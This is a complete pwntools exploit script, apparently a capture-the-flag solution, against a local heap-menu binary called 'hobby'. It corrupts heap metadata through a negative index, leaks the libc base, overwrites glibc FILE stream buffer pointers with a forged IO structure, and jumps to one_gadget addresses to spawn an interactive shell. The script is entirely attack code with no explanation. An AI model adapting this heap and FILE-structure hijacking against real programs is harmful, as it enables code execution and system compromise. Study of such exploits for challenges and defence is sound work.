from pwn import*

p=process('./hobby')

def menu(number):
	p.sendlineafter(">> ",str(number))

def add(name,hobby):
	menu(1)
	p.sendafter(": ",name)
	p.sendafter(": ",hobby)

def change(idx,name,hobby):
	menu(2)
	p.sendlineafter(": ",str(idx))
	p.sendafter(": ",name)
	p.sendafter(": ",hobby)

def delete(idx):
	menu(3)
	p.sendlineafter(": ",str(idx))
add('cgh','a'*0x98)
add('kjm','b'*0x98)

delete(0)
change(0,p64(0x6020e0-0x10+0x20)[:7],'a'*0x90+p64(0x80))

add('cgh','a'*0x10)

menu(4)

libc_base = u64(p.recv(6).ljust(8,'\x00')) - 3951409

print hex(libc_base)

# gadget
magic_num = 0x00000000fbad2887
io_buf_base = libc_base+3950947
one_list = [0x45226,0x4527a,0xf0364,0xf1207]

pay = ''
#pay += p64(io_buf_base-270)
pay += p64(io_buf_base)*0x6
pay += p64(io_buf_base+0x10000)	# io_buf_end
raw_input()
change(-2,p64(io_buf_base)[:7],pay)

pay = ''
pay += '\x00'*5
pay += p64(libc_base+3958672)	# fake dummy
pay += p64(0xffffffffffffffff)+p64(0)
pay += p64(libc_base+3951040)
pay += p64(0)*0x3
pay += p64(0xffffffff)
pay += p64(0)*2
pay += p64(libc_base+3951056-0x10)	# io_wide_data
pay += p64(0)*2
pay += p64(libc_base+one_list[2])*20
raw_input()
p.sendline(pay)

p.interactive()
